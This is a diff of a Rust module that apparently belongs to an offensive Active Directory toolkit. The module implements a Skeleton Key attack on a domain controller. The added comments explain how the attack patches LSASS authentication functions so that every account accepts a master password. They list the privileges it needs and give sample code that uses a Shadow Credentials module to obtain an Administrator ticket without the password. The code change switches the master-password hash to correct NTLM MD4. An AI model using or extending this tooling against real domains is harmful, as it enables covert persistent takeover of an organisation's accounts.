@@ -1,7 +1,49 @@
 ﻿//! Skeleton Key injection — patch LSASS on a DC to accept a master password.
 //!
-//! This module orchestrates the Skeleton Key attack by deploying a
-//! payload to the DC via SMB and triggering LSASS patching.
+//! # ⚠️ Windows-Only Attack (Requires C2 Session on DC)
+//!
+//! This is an **orchestration-only** implementation. The actual LSASS patching
+//! requires either:
+//! - A kernel driver (mimidrv.sys) for PPL-protected LSASS
+//! - A DLL injected into LSASS process memory
+//! - Direct memory manipulation via `VirtualAllocEx`/`WriteProcessMemory`
+//!
+//! None of these can be done remotely from Linux/macOS. This module provides
+//! the attack metadata, deployment commands, and cleanup instructions.
+//!
+//! # Cross-Platform Alternative: Shadow Credentials
+//!
+//! For a **fully cross-platform** persistence method that achieves similar goals,
+//! use the `shadow_credentials` module instead:
+//!
+//! ```ignore
+//! // Shadow Credentials works from Linux/macOS/Windows
+//! use overthrone_forge::shadow_credentials::{ShadowCredentialsConfig, execute};
+//!
+//! let config = ShadowCredentialsConfig {
+//!     target: "Administrator".to_string(),
+//!     cleanup: false,
+//!     ..Default::default()
+//! };
+//!
+//! let result = execute(&mut ldap, &config).await?;
+//! // Result: TGT for Administrator without knowing their password
+//! ```
+//!
+//! # Attack Details
+//!
+//! The Skeleton Key attack patches LSASS in-memory on a Domain Controller:
+//! - Patches `msv1_0!MsvpPasswordValidate` (NTLM)
+//! - Patches `kerberos!CDLocateCSystem` (Kerberos)
+//! - After patching: ALL domain accounts accept BOTH real password AND master password
+//! - Survives until DC reboot
+//!
+//! # Requirements
+//!
+//! - Domain Admin privileges
+//! - Local code execution on the DC (via C2, PSExec, WinRM, etc.)
+//! - `SeDebugPrivilege` to access LSASS
+//! - Kernel driver if LSASS runs as PPL (Protected Process Light)
 
 use overthrone_core::error::{OverthroneError, Result};
 use tracing::{info, warn};
@@ -103,14 +145,11 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
 /// Compute NTLM hash of the skeleton master password.
 fn compute_skeleton_ntlm(password: &str) -> Vec<u8> {
     // MD4(UTF-16LE(password)) — the standard NTLM hash
-    // We manually implement since we may not have md4 in this crate
-    use md5::{Md5, Digest};
-    // Fallback: use MD5 as a placeholder hash for the master key
-    // In production, this would use the core ntlm::nt_hash() function
+    use md4::{Md4, Digest};
     let utf16: Vec<u8> = password.encode_utf16()
         .flat_map(|c| c.to_le_bytes())
         .collect();
-    let mut hasher = Md5::new();
+    let mut hasher = Md4::new();
     hasher.update(&utf16);
     hasher.finalize().to_vec()
 }
